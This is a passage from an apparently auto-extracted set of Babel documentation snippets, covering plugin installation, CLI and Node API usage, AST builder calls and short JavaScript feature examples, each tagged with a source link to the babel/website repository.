this.constructor;\n  }\n\n  test() {\n    void 0;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Gulp\nDESCRIPTION: This snippet illustrates how to switch from the `jsx` plugin to the `babel` plugin in Gulp for JSX transformation. It involves replacing the `jsx()` call with `babel()` in the Gulp pipeline.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\ngulp.src('views/**/*.js')\n    .pipe(jsx())\n    .pipe(gulp.dest('dist'));\n```\n\n----------------------------------------\n\nTITLE: Creating a Private Name Node in Babel\nDESCRIPTION: Creates a `PrivateName` AST node using the Babel types module. This node represents a private name identifier, requiring an `id` argument.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_141\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.privateName(id);\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json JSON\nDESCRIPTION: This JSON configuration shows how to enable the `@babel/plugin-transform-instanceof` plugin within a `babel.config.json` file. This is the recommended method for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-instanceof\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Use Babel Plugin via Node.js API\nDESCRIPTION: Uses the Babel Node.js API to transform code with the transform-regexp-modifiers plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-regexp-modifiers.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(code, {\n  plugins: [\"@babel/plugin-transform-regexp-modifiers\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Creating a TSThisType Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSThisType` AST node using Babel's `t.tsThisType` method. It does not require any arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_208\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsThisType();\n```\n\n----------------------------------------\n\nTITLE: Create Import Default Specifier AST Node (JavaScript)\nDESCRIPTION: Creates an `ImportDefaultSpecifier` AST node using the `t.importDefaultSpecifier` builder. This node represents the default import specifier. The parameter is the local identifier to which the default export is assigned.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_82\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.importDefaultSpecifier(local);\n```\n\n----------------------------------------\n\nTITLE: Creating a TSImportType Node in JavaScript\nDESCRIPTION: This example shows how to create a `TSImportType` AST node using the `t.tsImportType` builder function. It takes a string literal argument, an optional qualifier (`TSEntityName`), and an optional `TSTypeParameterInstantiation`.  This represents a TypeScript `import()` type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_177\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsImportType(argument, qualifier, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via CLI\nDESCRIPTION: Uses the @babel/plugin-bugfix-firefox-class-in-computed-class-key plugin via the Babel CLI to transform a JavaScript file. This command specifies the plugin using the --plugins option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-bugfix-firefox-class-in-computed-class-key.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nbabel --plugins @babel/plugin-bugfix-firefox-class-in-computed-class-key script.js\n```\n\n----------------------------------------\n\nTITLE: Using WeakMaps JavaScript\nDESCRIPTION: This code demonstrates the use of the `WeakMap` data structure. It creates a new WeakMap and sets a key-value pair. WeakMaps only allow objects as keys and do not prevent garbage collection. It requires the Babel polyfill.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_22\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Weak Maps\nvar wm = new WeakMap();\nwm.set(s, { extra: 42 });\nwm.size === undefined\n```\n\n----------------------------------------\n\nTITLE: Decorators Before Export (JavaScript)\nDESCRIPTION: Illustrates the behavior of the `decoratorsBeforeExport` option. When set to `false`, decorators appear after the `export` keyword.  When set to `true`, decorators appear before the `export` keyword.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\n// decoratorsBeforeExport: false\nexport @decorator class Bar {}\n\n// decoratorsBeforeExport: true\n@decorator\nexport class Foo {}\n```\n\n----------------------------------------\n\nTITLE: Installing the plugin\nDESCRIPTION: This command installs the @babel/plugin-syntax-pipeline-operator package using npm.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-pipeline-operator.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install @babel/plugin-syntax-pipeline-operator\n```\n\n----------------------------------------\n\nTITLE: Checking for TypeScript Nodes in JavaScript\nDESCRIPTION: This snippet illustrates how to use Babel's `t.isTypeScript` method to determine if an AST node is a TypeScript-specific node. This method checks if the given node is defined as part of the TypeScript syntax extension. This is helpful when processing code that includes TypeScript-specific features and requires conditional handling based on the presence of TypeScript syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_299\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.isTypeScript(node);\n```\n\n----------------------------------------\n\nTITLE: Use Babel plugin via CLI\nDESCRIPTION: Executes the Babel CLI with the @babel/plugin-proposal-record-and-tuple plugin to transform a JavaScript file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-record-and-tuple.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ babel --plugins @babel/plugin-proposal-record-and-tuple script.js\n```\n\n----------------------------------------\n\nTITLE: Use plugin via Node API - JavaScript\nDESCRIPTION: Transforms code using the `minify-type-constructors` plugin via the Node API.  Requires `@babel/core`. Takes the input code string and plugin name as parameters to `transformSync`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-type-constructors.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"minify-type-constructors\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Install plugin via npm Shell\nDESCRIPTION: This shell command shows how to install the `@babel/plugin-syntax-import-attributes` plugin as a development dependency using npm. This command prepares the project to use the plugin by downloading and adding it to the `node_modules` directory and `package.json`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-attributes.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-import-attributes\n```\n\n----------------------------------------\n\nTITLE: Creating a TaggedTemplateExpression Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TaggedTemplateExpression` AST node using Babel's `t.taggedTemplateExpression` method.  It requires a tag expression and a template literal quasi.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_225\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.taggedTemplateExpression(tag, quasi);\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugin via JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure the plugin within a Babel configuration file (e.g., `.babelrc` or `babel.config.js`).  It showcases both a basic configuration without options, and one with include/exclude options to specify which environment variables to process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-inline-environment-variables.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n// without options\n{\n  \"plugins\": [\"transform-inline-environment-variables\"]\n}\n\n// with options\n{\n  \"plugins\": [\n    [\"transform-inline-environment-variables\", {\n      \"include\": [\n        \"NODE_ENV\"\n      ]\n    }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming Code via Node API\nDESCRIPTION: Transforms JavaScript code using the `@babel/core` Node API. The `transformSync` function takes the code string and an options object, which includes the `@babel/plugin-syntax-import-meta` plugin to enable `import.meta` syntax parsing.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-import-meta.md#_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-syntax-import-meta\"]\n});\n```\n\n----------------------------------------\n\nTITLE: Node API Usage - JavaScript\nDESCRIPTION: This snippet shows how to use the @babel/plugin-proposal-destructuring-private plugin via the Babel Node API.  It uses the transformSync method and includes the plugin in the plugins option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-destructuring-private.md#_snippet_5\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-proposal-destructuring-private\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Exporting Default and Named Members JavaScript\nDESCRIPTION: This code snippet demonstrates how to export both a default export (a function in this case) and named exports from a module. It exports a default function and named exports `e` and all exports from `lib/math` via `export *`. It depends on `lib/math`. The default function is an exponential function.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\n// lib/mathplusplus.js\nexport * from \"lib/math\";\nexport var e = 2.71828182846;\nexport default function(x) {\n    return Math.exp(x);\n}\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Identifier in JavaScript\nDESCRIPTION: This snippet creates a `JSXIdentifier` AST node using Babel's `t.jsxIdentifier` builder. The `name` parameter is a string representing the identifier's name.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_100\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxIdentifier(name);\n```\n\n----------------------------------------\n\nTITLE: Using the plugin via Node API (JavaScript)\nDESCRIPTION: This JavaScript code demonstrates how to use the `@babel/plugin-proposal-optional-chaining-assign` plugin programmatically via the Babel Node API.  The `transformSync` method is used to transform the code with the specified plugin and options.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-optional-chaining-assign.md#_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [[\"@babel/plugin-proposal-optional-chaining-assign\", {\n      \"version\": \"2023-07\"\n    }]],\n});\n```\n\n----------------------------------------\n\nTITLE: Babel Generator Flow Comma Separator Option (JavaScript)\nDESCRIPTION: This snippet configures the `babel-generator` with the `flowCommaSeparator` option. When set to true, Flow object types will use commas instead of semicolons as separators.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_15\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"generatorOpts\": {\n    \"flowCommaSeparator\": true // defaults to false\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Static Private Accessors in Babel\nDESCRIPTION: This snippet demonstrates the use of static private accessors, part of the static class features proposal. These accessors are only accessible within the class.  Babel needs to transpile this syntax for older environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Dog {\n  static get #className() { return \"Dog\"; }\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Numeric Separators JavaScript\nDESCRIPTION: This plugin makes numeric literals more readable by creating a visual separation (a `_`) between groups of digits. It transforms numeric literals with underscores to their standard numeric form.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2017-09-12-planning-for-7.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n1_000_000_000\n0b1010_0001_1000_0101\n0xA0_B0_C0\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n1000000000\n0b1010000110000101\n0xA0B0C0\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel with babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-do-expressions plugin by adding it to the plugins array in the babel.config.json file. This enables the parsing of do expressions during the Babel transformation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-do-expressions.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-do-expressions\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Ember CLI Babel\nDESCRIPTION: This shell command installs the ember-cli-babel addon to enable Babel transpilation in an Ember.js project. Babel allows developers to use modern JavaScript syntax and features, which are then compiled down to code that can be run in older browsers. The command uses the ember-cli tooling to add the package as a dependency.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/ember/install.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nember install ember-cli-babel\n```\n\n----------------------------------------\n\nTITLE: Parsing for import.meta JavaScript\nDESCRIPTION: This snippet shows how the `import.meta` syntax is now parsed by default in Babel.  `import.meta` is a host-provided object with metadata about the module. This snippet simply logs the object to the console.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2020-05-25-7.10.0.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nconsole.log(import.meta); // { url: \"file:///home/user/my-module.js\" }\n```\n\n----------------------------------------\n\nTITLE: JavaScript __proto__ Limitation Example\nDESCRIPTION: Demonstrates a limitation of the __proto__ property when used with this Babel plugin. Modifying the prototype object does not update the inheriting object's properties because a copy is made during transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar foo = { a: 1 };\nvar bar = { b: 2 };\nbar.__proto__ = foo;\nbar.a; // 1\nfoo.a = 2;\nbar.a; // 1 - should be 2 but remember that nothing is bound and it's a straight copy\n```\n\n----------------------------------------\n\nTITLE: Creating a WhileStatement with Babel\nDESCRIPTION: Creates a `WhileStatement` AST node using the `t.whileStatement` method.  This represents a `while` loop, where `test` is an `Expression` determining the loop condition, and `body` is a `Statement` representing the loop body.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_250\n\nLANGUAGE: javascript\nCODE:\n```\nt.whileStatement(test, body);\n```\n\n----------------------------------------\n\nTITLE: Installing @babel/plugin-syntax-flow\nDESCRIPTION: Installs the @babel/plugin-syntax-flow plugin as a development dependency using npm. This plugin allows Babel to parse Flow syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-flow.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-flow\n```\n\n----------------------------------------\n\nTITLE: Minified ES5 Code Example\nDESCRIPTION: This code shows the result of transpiling ES2015 to ES5 with Babel and then minifying with UglifyJS. This is the traditional way to minify ES2015 code. Babili aims to eliminate the Babel step.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-08-26-babili.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\n// ES2015 code -> Babel -> Uglify/Babili -> Minified ES5 Code\nvar a=function a(b){_classCallCheck(this,a),this.program=b};a();\n```\n\n----------------------------------------\n\nTITLE: input2.js file example\nDESCRIPTION: Shows an example javascript file that contains an import.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\n// input2.js\nimport \"a\";\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Usage via Node API JavaScript\nDESCRIPTION: This example shows how to use the @babel/plugin-transform-async-to-generator plugin via the Node API using require(\"@babel/core\").transformSync. It transforms the provided code string.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-async-to-generator.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-async-to-generator\"],\n});\n```\n\n----------------------------------------\n\nTITLE: Using a custom plugin in an inline script\nDESCRIPTION: This snippet demonstrates using a custom Babel plugin in an inline script tag, enabled via the data-plugins attribute. This example requires a plugin named 'lolizer' to be registered.\nSOURCE: https://github.com/babel/website/blob/main/docs/standalone.md#_snippet_10\n\nLANGUAGE: html\nCODE:\n```\n<script type=\"text/babel\" data-plugins=\"lolizer\">\n\n```\n\n----------------------------------------\n\nTITLE: Class with Private Method and Field (JavaScript, Symbols)\nDESCRIPTION: This JavaScript code defines a class with a private method and field. The `privateFieldsAsSymbols` assumption informs Babel that soft privacy is enough for private fields and, thus, they can be stored as public properties with a symbol key.\nSOURCE: https://github.com/babel/website/blob/main/docs/assumptions.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Foo {\n  #method() {}\n\n  #field = 2;\n\n  run() {\n    this.#method();\n    this.#field++;\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Use Plugin via CLI Shell\nDESCRIPTION: This shell command demonstrates how to use the `@babel/plugin-proposal-function-sent` plugin directly from the command line using the Babel CLI. The `--plugins` option specifies the plugin to be used during the transformation of the `script.js` file.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-sent.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-proposal-function-sent script.js\n```\n\n----------------------------------------\n\nTITLE: Decorators Support in Babel\nDESCRIPTION: This snippet demonstrates the use of decorators, which are used to modify or extend classes and their members. The `@autoIncrement` decorator is applied to the `age` property. Babel needs to be configured with the decorators plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/features-timeline.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nclass Person {\n  @autoIncrement age;\n}\n```\n\n----------------------------------------\n\nTITLE: Using plugin via CLI\nDESCRIPTION: Demonstrates how to use the Babel CLI to transform files using the specified plugin. The @babel/plugin-transform-unicode-escapes plugin is passed as an argument to the --plugins option.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-unicode-escapes.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-unicode-escapes\n```\n\n----------------------------------------\n\nTITLE: Babel Node API Usage\nDESCRIPTION: Shows how to use the plugin via the Babel Node API. The `transformSync` method from `@babel/core` is used to transform the code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-proto-to-assign.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/core\").transformSync(\"code\", {\n  plugins: [\"@babel/plugin-transform-proto-to-assign\"],\n});\n```\n\n----------------------------------------\n\nTITLE: ObjectTypeAnnotation Initialization\nDESCRIPTION: This migration guide clarifies that `indexers`, `callProperties`, and `internalSlots` are initialized as empty arrays in `t.objectTypeAnnotation` in Babel 8, matching the parser behavior.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_67\n\n\n\n----------------------------------------\n\nTITLE: Using V8 Intrinsic Runtime Functions in JavaScript\nDESCRIPTION: This code snippet shows how to use V8 intrinsic runtime functions in JavaScript, which are non-standard extensions specific to the V8 engine. The `%GetOptimizationStatus` function is used to check the optimization status of a given function. This requires enabling the `--allow-natives-syntax` flag in V8 and the `v8intrinsic` plugin in `@babel/parser`.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-09-05-7.6.0.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction fn() { /* ... */ }\n\nconst status = %GetOptimizationStatus(fn);\n\nif (status === 2) {\n  console.log(\"The function is not optimized!\");\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a TypeCastExpression with Babel\nDESCRIPTION: Creates a `TypeCastExpression` AST node using the `t.typeCastExpression` method. This node represents a type cast expression in Flow, where `expression` is the expression to be cast, and `typeAnnotation` is a `TypeAnnotation` node defining the target type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_237\n\nLANGUAGE: javascript\nCODE:\n```\nt.typeCastExpression(expression, typeAnnotation);\n```\n\n----------------------------------------\n\nTITLE: Creating a YieldExpression with Babel\nDESCRIPTION: Creates a `YieldExpression` AST node using the `t.yieldExpression` method. This node represents a `yield` expression, where `argument` is the value to yield (optional), and `delegate` is a boolean indicating if it's a delegated yield (e.g., `yield*`).\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_252\n\nLANGUAGE: javascript\nCODE:\n```\nt.yieldExpression(argument, delegate);\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Parser Error Recovery\nDESCRIPTION: This code demonstrates the `errorRecovery` option in `@babel/parser`. When set to `true`, the parser attempts to recover from syntax errors and includes them in the `errors` property of the resulting AST, rather than throwing an exception.  Not all errors are recoverable.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2019-11-05-7.7.0.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst input = `\nlet a = {\n  __proto__: x,\n  __proto__: y\n}\n\nlet a = 2;\n`;\n\nparser.parse(input); // Throws \"Redefinition of __proto__ property\"\n\nconst ast = parser.parse(input, { errorRecovery: true });\nast.errors == [\n  SyntaxError: \"Redefinition of __proto__ property\",\n  SyntaxError: \"Identifier 'a' has already been declared\",\n];\n```\n\n----------------------------------------\n\nTITLE: JavaScript super() Compilation - Loose Mode\nDESCRIPTION: Demonstrates the simplified compilation of `super()` in Loose Mode using 6to5 (now Babel). This mode optimizes for smaller and faster output by ignoring certain spec edge cases.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-01-27-2to3.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction Foo() {\n  Bar.call(this);\n}\n```\n\n----------------------------------------\n\nTITLE: Installing React.Core NuGet Package\nDESCRIPTION: This command installs the React.Core package from NuGet, which provides Babel support for ReactJS.NET. ReactJS.NET enables using React components within .NET applications. It requires NuGet Package Manager to be installed and configured.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/dotnet/install.md#_snippet_0\n\nLANGUAGE: PowerShell\nCODE:\n```\nInstall-Package React.Core\n```\n\n----------------------------------------\n\nTITLE: Creating JSX Spread Child in JavaScript\nDESCRIPTION: This snippet creates a `JSXSpreadChild` AST node using Babel's `t.jsxSpreadChild` builder. The `expression` parameter is an `Expression`.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_106\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.jsxSpreadChild(expression);\n```\n\n----------------------------------------\n\nTITLE: Install plugin\nDESCRIPTION: This command installs the @babel/plugin-transform-shorthand-properties plugin as a development dependency using npm. It's required to apply the plugin to your Babel configuration.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-shorthand-properties\n```\n\n----------------------------------------\n\nTITLE: Create Generic Type Annotation AST Node (JavaScript)\nDESCRIPTION: Creates a `GenericTypeAnnotation` AST node using the `t.genericTypeAnnotation` builder.  This node represents a generic type annotation.  Parameters include the identifier and type parameters.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_76\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.genericTypeAnnotation(id, typeParameters);\n```\n\n----------------------------------------\n\nTITLE: isIdentifierStart Function Definition\nDESCRIPTION: This TypeScript code defines the `isIdentifierStart` function, which checks if a given Unicode code point can start an identifier. The function returns `true` if the codepoint can start an identifier and `false` otherwise.\nSOURCE: https://github.com/babel/website/blob/main/docs/helper-validator-identifier.md#_snippet_3\n\nLANGUAGE: typescript\nCODE:\n```\nfunction isIdentifierStart(codepoint: number): boolean\n```\n\n----------------------------------------\n\nTITLE: Creating a TSTemplateLiteralType Node in JavaScript\nDESCRIPTION: This snippet shows how to create a `TSTemplateLiteralType` AST node using Babel's `t.tsTemplateLiteralType` method. It requires an array of `TemplateElement` quasis and an array of `TSType` types as arguments.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_207\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.tsTemplateLiteralType(quasis, types);\n```\n\n----------------------------------------\n\nTITLE: Object Rest Spread - ForXStatement (JavaScript)\nDESCRIPTION: Illustrates object rest spread being used in a `for...of` loop. This allows destructuring objects iterated over within the loop.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-11-16-6.19.0.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nfor ({a, ...b} of []) {} // ForXStatement\n```\n\n----------------------------------------\n\nTITLE: JSXIdentifier in JSXMemberExpression (JavaScript)\nDESCRIPTION: This example illustrates a bug fix related to how `JSXIdentifier` within `JSXMemberExpression` is handled. It addresses an issue with imported components using `JSXMemberExpression` in transform-react-inline-elements.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n// transform-react-inline-elements\n// issue with imported components that were JSXMemberExpression\nimport { form } from \"./export\";\n\nfunction ParentComponent() {\n  return <form.TestComponent />;\n}\n```\n\n----------------------------------------\n\nTITLE: Transform Infinity to 1 / 0 JavaScript\nDESCRIPTION: This snippet demonstrates the transformation performed by the babel-plugin-minify-infinity plugin. It shows the input `Infinity` being converted to `1 / 0`. This is a common optimization technique used during code minification to reduce the size of the output.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-infinity.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nInfinity;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\n1 / 0;\n```\n\n----------------------------------------\n\nTITLE: Installing JSON Strings Syntax Plugin\nDESCRIPTION: Installs the @babel/plugin-syntax-json-strings package as a development dependency using npm or yarn. This plugin enables Babel to parse JSON string syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-json-strings.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-json-strings\n```\n\n----------------------------------------\n\nTITLE: Correct compilation of async iterator methods (JavaScript)\nDESCRIPTION: This snippet addresses an incorrect compilation issue related to async iterator methods.  It ensures that async generator methods are correctly transformed without inadvertently retaining generator syntax.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\n// in\nclass C {\n  async *g() { await 1; }\n}\n// out\nclass C {\n  g() { // was incorrectly outputting the method with a generator still `*g(){`\n    return _asyncGenerator.wrap(function* () {\n      yield _asyncGenerator.await(1);\n    })();\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: TSTypeParameter AST (Babel 8)\nDESCRIPTION: This is the AST representation of a TSTypeParameter node in Babel 8. The `name` property is now an Identifier node, which is a breaking change but aligns with `@typescript-eslint`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"type\": \"TSTypeParameter\",\n  \"name\": { \"type\": \"Identifier\", \"name\": \"T\" }\n}\n```\n\n----------------------------------------\n\nTITLE: Use plugin via CLI Shell\nDESCRIPTION: This command demonstrates how to use the `@babel/plugin-transform-instanceof` plugin via the Babel CLI. It specifies the plugin to use when transpiling `script.js`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nbabel --plugins @babel/plugin-transform-instanceof script.js\n```\n\n----------------------------------------\n\nTITLE: Transform Shorthand Properties - Example Out\nDESCRIPTION: This JavaScript code shows the output after applying the @babel/plugin-transform-shorthand-properties plugin.  The shorthand properties have been expanded to explicit key-value pairs. This ensures compatibility with older JavaScript environments.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar o = { a: a, b: b, c: c };\n```\n\n----------------------------------------\n\nTITLE: Install Plugin: npm\nDESCRIPTION: This command installs the babel-plugin-minify-mangle-names package as a development dependency using npm. It's a prerequisite for using the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-minify-mangle-names.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install babel-plugin-minify-mangle-names --save-dev\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Plugin (babel.config.json)\nDESCRIPTION: This JSON snippet shows how to configure the `babel-plugin-transform-remove-undefined` plugin in a `babel.config.json` file.  This is the recommended way to use the plugin.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-remove-undefined.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"babel-plugin-transform-remove-undefined\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Using WeakSets JavaScript\nDESCRIPTION: This code demonstrates the use of the `WeakSet` data structure. It creates a new WeakSet and adds an object to it. WeakSets only hold objects weakly, allowing garbage collection. It requires the Babel polyfill.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_23\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Weak Sets\nvar ws = new WeakSet();\nws.add({ data: 42 });\n// Because the added object has no other references, it will not be held in the set\n```\n\n----------------------------------------\n\nTITLE: Using useBuiltIns option for React JSX spread (JavaScript)\nDESCRIPTION: This snippet demonstrates how to use the `useBuiltIns` option with the helper-builder-react-jsx to leverage native or polyfilled implementations of `Object.assign` when spreading props in JSX. It enables efficient handling of spread properties.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2016-10-24-6.18.0.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\n// in\nvar div = <Component {...props} foo=\"bar\" />\n// out\nvar div = React.createElement(Component, Object.assign({}, props, { foo: \"bar\" }));\n```\n\n----------------------------------------\n\nTITLE: Installing Async Do Expressions Syntax Plugin\nDESCRIPTION: This command installs the @babel/plugin-syntax-async-do-expressions plugin as a development dependency using npm. It allows Babel to parse the async do expressions syntax but does not transform it.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-async-do-expressions.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-syntax-async-do-expressions\n```\n\n----------------------------------------\n\nTITLE: Template Strings in JavaScript\nDESCRIPTION: Shows the 